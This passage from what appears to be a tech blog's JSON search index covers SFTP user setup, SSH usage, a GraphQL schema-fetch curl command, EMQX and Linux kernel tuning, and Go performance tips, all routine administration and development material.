使用者的群組為 share01-prod\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo usermod -G share01-prod dev_user\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定密碼\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo passwd qa_user\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"5-設定權限\"\u003e5. 設定權限\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定 /home/test 資料夾(含下級資料夾)的使用者為 qa_test_user，群組為 share01-test\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo chown -R qa_test_user:share01-test test/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定 /home/prod 資料夾(含下級資料夾)的使用者為 qa_user，群組為 share01-prod\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo chown -R qa_user:share01-prod prod/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# SFTP 登入資料夾權限要給 root\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo chown root:root /home/test\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo chown root:root /home/prod\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"6-設定-etcsshsshd_config\"\u003e6. 設定 /etc/ssh/sshd_config\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003e/etc/ssh/sshd_config\u003c/code\u003e\u003c/p\u003e","tags":["SSH","SFTP","Linux"],"title":"Add SFTP user and share directory"},{"categories":["SSH","terminal"],"contents":"Use terminal and SSH to remote host 1. Modern Terminals Hyper iTerm2 Tabby Warp Wez\u0026rsquo;s Terminal WindTerm 2. Open terminal in macOS ⌘ + space open Spotlight search terminal.app press ↩ 3. SSH to remote host ensure the private key file path. enter the command in the terminal: ssh -i /path/to/private_key.pem ubuntu@ubuntu.host.com ","date":"November 24, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20231124-ssh/","summary":"\u003ch1 id=\"use-terminal-and-ssh-to-remote-host\"\u003eUse terminal and SSH to remote host\u003c/h1\u003e\n\u003ch2 id=\"1-modern-terminals\"\u003e1. Modern Terminals\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/vercel/hyper\" target=\"_blank\" rel=\"noopener\"\u003eHyper\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://iterm2.com/\" target=\"_blank\" rel=\"noopener\"\u003eiTerm2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/Eugeny/tabby\" target=\"_blank\" rel=\"noopener\"\u003eTabby\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.warp.dev/\" target=\"_blank\" rel=\"noopener\"\u003eWarp\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/wez/wezterm\" target=\"_blank\" rel=\"noopener\"\u003eWez\u0026rsquo;s Terminal\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/kingToolbox/WindTerm\" target=\"_blank\" rel=\"noopener\"\u003eWindTerm\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"2-open-terminal-in-macos\"\u003e2. Open terminal in macOS\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003e⌘ + space\u003c/code\u003e open Spotlight\n\u003cimg src=\"/posts/2023/20231124-ssh/pics/auto_20231124_222253.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003cli\u003esearch terminal.app\n\u003cimg src=\"/posts/2023/20231124-ssh/pics/auto_20231124_222316.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003cli\u003epress \u003ccode\u003e↩\u003c/code\u003e\n\u003cimg src=\"/posts/2023/20231124-ssh/pics/auto_20231124_222410.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"3-ssh-to-remote-host\"\u003e3. SSH to remote host\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003eensure the private key file path.\u003c/li\u003e\n\u003cli\u003eenter the command in the terminal: \u003ccode\u003essh -i /path/to/private_key.pem ubuntu@ubuntu.host.com\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e","tags":["SSH","terminal"],"title":"Use terminal and SSH to remote host"},{"categories":["GraphQL","cURL"],"contents":"curl \\ -XPOST \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;query\u0026#34;:\u0026#34;{__schema { types { name enumValues { name } fields { name type {name kind enumValues { name } ofType { name kind ofType {name kind}}}}}}}\u0026#34;}\u0026#39; \\ https://example.com/graphql ","date":"October 18, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20231018-graphql/","summary":"\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  -XPOST \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;query\u0026#34;:\u0026#34;{__schema { types { name enumValues { name } fields { name type {name kind enumValues { name } ofType { name kind ofType {name kind}}}}}}}\u0026#34;}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  https://example.com/graphql\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["GraphQL","cURL"],"title":"Fetch GraphQL schema information"},{"categories":["Kubernetes","Docker","Container","Linux","Security","URL"],"contents":" Container security fundamentals: Exploring containers as processes Container security fundamentals part 2: Isolation \u0026amp; namespaces Container security fundamentals part 3: Capabilities Container security fundamentals part 4: Cgroups Container security fundamentals part 5: AppArmor and SELinux Container security fundamentals part 6: seccomp ","date":"October 4, 2023","hero":"/images/hero/docker.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20231004-container/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-1/\" target=\"_blank\" rel=\"noopener\"\u003eContainer security fundamentals: Exploring containers as processes\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-2/\" target=\"_blank\" rel=\"noopener\"\u003eContainer security fundamentals part 2: Isolation \u0026amp; namespaces\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-3/\" target=\"_blank\" rel=\"noopener\"\u003eContainer security fundamentals part 3: Capabilities\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-4/\" target=\"_blank\" rel=\"noopener\"\u003eContainer security fundamentals part 4: Cgroups\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-5/\" target=\"_blank\" rel=\"noopener\"\u003eContainer security fundamentals part 5: AppArmor and SELinux\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-6/\" target=\"_blank\" rel=\"noopener\"\u003eContainer security fundamentals part 6: seccomp\n\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["Kubernetes","Docker","Container","Linux","Security","URL"],"title":"Container security fundamentals"},{"categories":["Kubernetes","MQTT","EMQX","Linux","URL"],"contents":" Tuning EMQX to Scale to One Million Concurrent Connection on Kubernetes Performance Tuning (Linux) 矽谷牛的耕田筆記 Linux Kernel Tuning node level, basically the non-namespaced sysctls # Sets the maximum number of file handles allowed by the kernel sysctl -w fs.file-max=2097152 # Sets the maximum number of open file descriptors that a process can have sysctl -w fs.nr_open=2097152 namespaced sysctls # Sets the maximum number of connections that can be queued for acceptance by the kernel. sysctl -w net.core.somaxconn=32768 # Sets the maximum number of SYN requests that can be queued by the kernel sysctl -w net.ipv4.tcp_max_syn_backlog=16384 # Setting the minimum, default and maximum size of TCP Buffer sysctl -w net.ipv4.tcp_rmem=\u0026#39;1024 4096 16777216\u0026#39; sysctl -w net.ipv4.tcp_wmem=\u0026#39;1024 4096 16777216\u0026#39; # Setting Parameters for TCP Connection Tracking sysctl -w net.netfilter.nf_conntrack_tcp_timeout_time_wait=30 # Controls the maximum number of entries in the TCP time-wait bucket table sysctl -w net.ipv4.tcp_max_tw_buckets=1048576 # Controls Timeout for FIN-WAIT-2 Sockets: sysctl -w net.ipv4.tcp_fin_timeout=15 There are some more namespaced sysctls that will improve the performance but because of an active issue we are not able to set them on the container level # Sets the size of the backlog queue for the network device sysctl -w net.core.netdev_max_backlog=16384 # Amount of memory that is allocated for storing incoming and outgoing data for a socket sysctl -w net.core.rmem_default=262144 sysctl -w net.core.wmem_default=262144 # Setting the maximum amount of memory for the socket buffers sysctl -w net.core.rmem_max=16777216 sysctl -w net.core.wmem_max=16777216 sysctl -w net.core.optmem_max=16777216 Erlang VM Tuning ## Erlang Process Limit node.process_limit = 2097152 ## Sets the maximum number of simultaneously existing ports for this system node.max_ports = 2097152 EMQX Broker Tuning # Other configuration… EMQX_LISTENER__TCP__EXTERNAL: \u0026#34;0.0.0.0:1883\u0026#34; EMQX_LISTENER__TCP__EXTERNAL__ACCEPTORS: 64 EMQX_LISTENER__TCP__EXTERNAL__MAX_CONNECTIONS: 1024000 ","date":"September 27, 2023","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230927-mqtt/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.infracloud.io/blogs/scale-emqx-one-million-connections-kubernetes/\" target=\"_blank\" rel=\"noopener\"\u003eTuning EMQX to Scale to One Million Concurrent Connection on Kubernetes\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.emqx.io/docs/en/v5.2/performance/tune.html#linux-kernel-tuning\" target=\"_blank\" rel=\"noopener\"\u003ePerformance Tuning (Linux)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.facebook.com/technologynoteniu/posts/pfbid02ntZshJdTEHLhnkb4hATadU8qGdzB45T2AdmCqtx73oegqrCLNRTKJwkYNZkVNLMsl\" target=\"_blank\" rel=\"noopener\"\u003e矽谷牛的耕田筆記\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"linux-kernel-tuning\"\u003eLinux Kernel Tuning\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003enode level, basically the non-namespaced sysctls\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Sets the maximum number of file handles allowed by the kernel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w fs.file-max\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2097152\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Sets the maximum number of open file descriptors that a process can have\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w fs.nr_open\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2097152\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003enamespaced sysctls\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Sets the maximum number of connections that can be queued for acceptance by the kernel.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.core.somaxconn\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e32768\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Sets the maximum number of SYN requests that can be queued by the kernel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.ipv4.tcp_max_syn_backlog\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e16384\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Setting the minimum, default and maximum size of TCP Buffer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.ipv4.tcp_rmem\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1024 4096 16777216\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.ipv4.tcp_wmem\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1024 4096 16777216\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Setting Parameters for TCP Connection Tracking\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.netfilter.nf_conntrack_tcp_timeout_time_wait\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e30\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Controls the maximum number of entries in the TCP time-wait bucket table\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.ipv4.tcp_max_tw_buckets\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1048576\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Controls Timeout for FIN-WAIT-2 Sockets:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.ipv4.tcp_fin_timeout\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eThere are some more namespaced sysctls that will improve the performance but because of an active issue we are not able to set them on the container level\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Sets the size of the backlog queue for the network device\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.core.netdev_max_backlog\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e16384\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Amount of memory that is allocated for storing incoming and outgoing  data for a socket\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.core.rmem_default\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e262144\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.core.wmem_default\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e262144\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Setting the maximum amount of memory for the socket buffers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.core.rmem_max\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e16777216\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.core.wmem_max\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e16777216\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.core.optmem_max\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e16777216\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"erlang-vm-tuning\"\u003eErlang VM Tuning\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## Erlang Process Limit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enode.process_limit \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2097152\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## Sets the maximum number of simultaneously existing ports for this system\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enode.max_ports \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2097152\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"emqx-broker-tuning\"\u003eEMQX Broker Tuning\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Other configuration…\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eEMQX_LISTENER__TCP__EXTERNAL\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0.0.0.0:1883\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eEMQX_LISTENER__TCP__EXTERNAL__ACCEPTORS\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eEMQX_LISTENER__TCP__EXTERNAL__MAX_CONNECTIONS\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e1024000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["Kubernetes","MQTT","EMQX","Linux","URL"],"title":"調整系統使得 EMQX 可以支援 1M 連線"},{"categories":["Chrome OS","URL","Video"],"contents":" 老電腦別丟掉！安裝 Google 免費作業系統安裝教學（Chrome OS Flex /CloudReady） ","date":"September 27, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230927-chromeos/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/watch?v=Nc3bTBA4meo\" target=\"_blank\" rel=\"noopener\"\u003e老電腦別丟掉！安裝 Google 免費作業系統安裝教學（Chrome OS Flex /CloudReady）\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["Chrome OS","URL","Video"],"title":"Install Chrome OS"},{"categories":["AI","URL","Video"],"contents":" https://www.youtube.com/watch?v=M3z6gI1AEns ","date":"September 27, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230927-ai/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/watch?v=M3z6gI1AEns\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.youtube.com/watch?v=M3z6gI1AEns\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c!-- \n\n\n\n\n\u003cvideo class=\"video-player\" id=\"video-7\" playsinline controls\u003e\n  \u003csource src=\"https://www.youtube.com/watch?v=M3z6gI1AEns\" type=\"video/mp4\" /\u003e\n\u003c/video\u003e\n --\u003e","tags":["AI","URL","Video"],"title":"永齡基金會AI大師論壇:人工智慧如何形塑人類未來"},{"categories":["Go","URL"],"contents":" GO 编程模式：切片，接口，时间和性能 Go 语言是一个高性能的语言，但并不是说这样我们就不用关心性能了，我们还是需要关心的。下面是一个在编程方面和性能相关的提示。\n如果需要把数字转字符串，使用 strconv.Itoa() 会比 fmt.Sprintf() 要快一倍左右\n尽可能地避免把 String 转成[]Byte 。这个转换会导致性能下降。\n如果在 for-loop 里对某个 slice 使用 append()请先把 slice 的容量很扩充到位，这样可以避免内存重新分享以及系统自动按 2 的 N 次方幂进行扩展但又用不到，从而浪费内存。\n使用 StringBuffer 或是 StringBuild 来拼接字符串，会比使用 + 或 += 性能高三到四个数量级。\n尽可能的使用并发的 go routine，然后使用 sync.WaitGroup 来同步分片操作\n避免在热代码中进行内存分配，这样会导致 gc 很忙。尽可能的使用 sync.Pool 来重用对象。\n使用 lock-free 的操作，避免使用 mutex，尽可能使用 sync/Atomic 包。 （关于无锁编程的相关话题，可参看《无锁队列实现》或《无锁 Hashmap 实现》）\n使用 I/O 缓冲，I/O 是个非常非常慢的操作，使用 bufio.NewWrite() 和 bufio.NewReader() 可以带来更高的性能。\n对于在 for-loop 里的固定的正则表达式，一定要使用 regexp.Compile() 编译正则表达式。性能会得升两个数量级。\n如果你需要更高性能的协议，你要考虑使用 protobuf 或 msgp 而不是 JSON，因为 JSON 的序列化和反序列化里使用了反射。\n你在使用 map 的时候，使用整型的 key 会比字符串的要快，因为整型比较比字符串比较要快。\n","date":"September 26, 2023","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2023/20230926-golang/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://coolshell.cn/articles/21128.html\" target=\"_blank\" rel=\"noopener\"\u003eGO 编程模式：切片，接口，时间和性能\u003c/a\u003e\nGo 语言是一个高性能的语言，但并不是说这样我们就不用关心性能了，我们还是需要关心的。下面是一个在编程方面和性能相关的提示。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e如果需要把数字转字符串，使用 \u003ccode\u003estrconv.Itoa()\u003c/code\u003e 会比 \u003ccode\u003efmt.Sprintf()\u003c/code\u003e 要快一倍左右\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尽可能地避免把 \u003ccode\u003eString\u003c/code\u003e 转成\u003ccode\u003e[]Byte\u003c/code\u003e 。这个转换会导致性能下降。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e如果在 for-loop 里对某个 slice 使用 \u003ccode\u003eappend()\u003c/code\u003e请先把 slice 的容量很扩充到位，这样可以避免内存重新分享以及系统自动按 2 的 N 次方幂进行扩展但又用不到，从而浪费内存。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用 \u003ccode\u003eStringBuffer\u003c/code\u003e 或是 \u003ccode\u003eStringBuild\u003c/code\u003e 来拼接字符串，会比使用 \u003ccode\u003e+\u003c/code\u003e 或 \u003ccode\u003e+=\u003c/code\u003e 性能高三到四个数量级。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尽可能的使用并发的 go routine，然后使用 